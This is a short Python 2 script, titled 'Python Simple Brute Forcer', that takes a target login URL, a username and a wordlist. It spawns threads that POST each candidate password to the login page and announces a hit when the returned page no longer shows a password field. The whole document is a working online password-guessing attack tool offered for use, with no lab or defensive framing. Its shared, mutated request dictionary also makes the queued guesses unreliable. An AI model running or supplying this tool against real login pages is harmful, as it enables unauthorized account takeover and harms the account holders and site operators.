from urlparse import urlparse
from threading import Thread
import httplib, sys
from Queue import Queue
import bs4
import sys
import urllib
import argparse
import pdb

poisoned = False

requests_left = 0

def doWork():
    global poisoned
    while not poisoned:
        work_dict = q.get()
        response = doRequest(work_dict['url'], work_dict['data'])

        # something freaked.
        if response.status != 200:
            print "Hit a code %s" % response.status
            poisoned = True

        else:
            response_data = response.read()
            response_len = len(response_data)
            soup = bs4.BeautifulSoup(response_data)
            tags = soup.find_all("input",{"name":"password"})

            if len(tags) < 1:
                print "!!!!!!!!!!!!!!!"
                print "      GOT      "
                print work_dict['data']['password']
                print "!!!!!!!!!!!!!!!"
                poisoned = True
            else:
                print "%s : %d : len: %d" % (work_dict['data']['password'],response.status, response_len)

        q.task_done()

def doRequest(url, data):
    try:

        url = urlparse(url)
        data = urllib.urlencode(data)

        #ParseResult(scheme='https', netloc='example.net', path='/login', params='', query='', fragment='')
        if url.scheme != "https":
            conn = httplib.HTTPConnection(url.netloc)
        else:
            conn = httplib.HTTPSConnection(url.netloc)

        conn.request("POST", url.path, data)
        res = conn.getresponse()
        return res
    except:
        print "error"


parser = argparse.ArgumentParser(description='Python Simple Brute Forcer')
parser.add_argument('--url', type=str, help="URL of target login page (POST)")
parser.add_argument('--wlist', type=str, help="Path to the wordlist")
parser.add_argument('--user', type=str, help="Username")
parser.add_argument('--threads', type=int, help="Number of simultaneous requesters")
my_args = parser.parse_args()

concurrent = my_args.threads

q = Queue(concurrent * 2)
for i in range(concurrent):
    t = Thread(target=doWork)
    t.daemon = True
    t.start()
try:
    url = my_args.url

    this_password = ""

    # Todo: Add your extra parameters here (feature for this inbound layer)
    data = {
        "username":my_args.user,
        "password": this_password
    }

    passlist = open(my_args.wlist,"r")
    passwords = passlist.readlines()

    requests_left = len(passwords)

    for this_password in passwords:
        this_password = this_password.strip()
        data["password"] = this_password
        q.put({'url':url,'data':data})

except KeyboardInterrupt:
    sys.exit(1)


